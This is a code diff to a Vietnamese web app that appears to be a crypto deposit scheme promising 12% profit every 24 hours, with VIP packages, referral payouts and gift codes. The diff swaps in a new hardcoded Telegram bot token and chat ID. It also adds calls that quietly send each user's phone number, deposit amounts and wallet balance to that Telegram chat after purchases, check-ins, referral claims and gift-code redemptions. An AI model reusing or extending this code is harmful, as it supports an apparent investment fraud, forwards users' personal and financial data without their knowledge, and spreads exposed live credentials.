@@ -914,12 +914,12 @@
     }
 
     // ==================== CẤU HÌNH BOT TELEGRAM ====================
-    const TELEGRAM_CONFIG = {
-      botToken: '9185715897:AAGv-awurzGIEMl_Xgv7__wvqwQNdti2Uv8',
-      chatId: '-5521775863'
+        const TELEGRAM_CONFIG = {
+      botToken: '9026086925:AAFfbu1oOyasRCTJJXYzOj-2qanQhhnozsk',
+      chatId: '7865394196'
     };
 
-    async function sendTelegramNotification(text) {
+        async function sendTelegramNotification(text) {
       if (!TELEGRAM_CONFIG.botToken || !TELEGRAM_CONFIG.chatId) return;
       try {
         const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage?chat_id=${encodeURIComponent(TELEGRAM_CONFIG.chatId)}&text=${encodeURIComponent(text)}&parse_mode=HTML`;
@@ -1653,6 +1653,8 @@
       triggerCongrat('Ký Quỹ Thành Công!', `Chúc mừng bạn đã kích hoạt thành công ${item.name} (VIP ${item.vip}). Lợi nhuận sẽ được trả tự động sau mỗi 24h!`);
       pendingBuyPackageId = null;
       updateUI();
+
+      sendTelegramNotification(`⚡ <b>THÀNH VIÊN KÍCH HOẠT GÓI KÝ QUỸ</b>\n━━━━━━━━━━━━━━━━━━━━\n▫️ SĐT: <b>${currentUser.phone}</b>\n▫️ Gói coin: <b>${item.name} (VIP ${item.vip})</b>\n▫️ Giá trị: <b>${formatNumber(item.price)} đ</b>\n▫️ Lãi 24h: +${formatNumber(item.price * 0.12)} đ\n▫️ Số dư ví còn lại: ${formatNumber(currentUser.balance)} đ`);
     }
 
     function confirmBuySlotAction() {
@@ -1784,6 +1786,8 @@
 
       triggerCongrat('Điểm Danh Ngày ' + currentUser.attDayCount, `Bạn nhận được +${formatNumber(rew)}đ vào tài khoản ví!`);
       updateUI();
+
+      sendTelegramNotification(`📅 <b>THÀNH VIÊN ĐIỂM DANH</b>\n━━━━━━━━━━━━━━━━━━━━\n▫️ SĐT: <b>${currentUser.phone}</b>\n▫️ Ngày điểm danh: <b>Ngày ${currentUser.attDayCount}</b>\n▫️ Thưởng nhận: <b>+${formatNumber(rew)} đ</b>\n▫️ Số dư ví mới: ${formatNumber(currentUser.balance)} đ`);
     }
 
     function claimFriendRewardAction(count, rew) {
@@ -1802,6 +1806,8 @@
 
         triggerCongrat('Nhận Thưởng Thành Công!', `Đã nhận +${formatNumber(rew)}đ khi đạt mốc mời ${count} người nạp.`);
         updateUI();
+
+        sendTelegramNotification(`🏆 <b>NHẬN THƯỞNG NHIỆM VỤ MỜI BẠN</b>\n━━━━━━━━━━━━━━━━━━━━\n▫️ SĐT: <b>${currentUser.phone}</b>\n▫️ Mốc đạt: <b>Mời ${count} người nạp</b>\n▫️ Tiền thưởng: <b>+${formatNumber(rew)} đ</b>\n▫️ Số dư ví mới: ${formatNumber(currentUser.balance)} đ`);
       }
     }
 
@@ -2154,6 +2160,8 @@
         input.value = '';
         triggerCongrat('Nhận Quà Thành Công!', `Chúc mừng bạn đã nhận được +${formatNumber(bonus)}đ vào số dư ví từ mã quà tặng [${code}]!`);
         updateUI();
+
+        sendTelegramNotification(`🎁 <b>THÀNH VIÊN NHẬP GIFTCODE</b>\n━━━━━━━━━━━━━━━━━━━━\n▫️ SĐT: <b>${currentUser.phone}</b>\n▫️ Mã quà: <code>${code}</code>\n▫️ Thưởng nhận: <b>+${formatNumber(bonus)} đ</b>\n▫️ Số dư ví mới: ${formatNumber(currentUser.balance)} đ`);
       });
     }
 
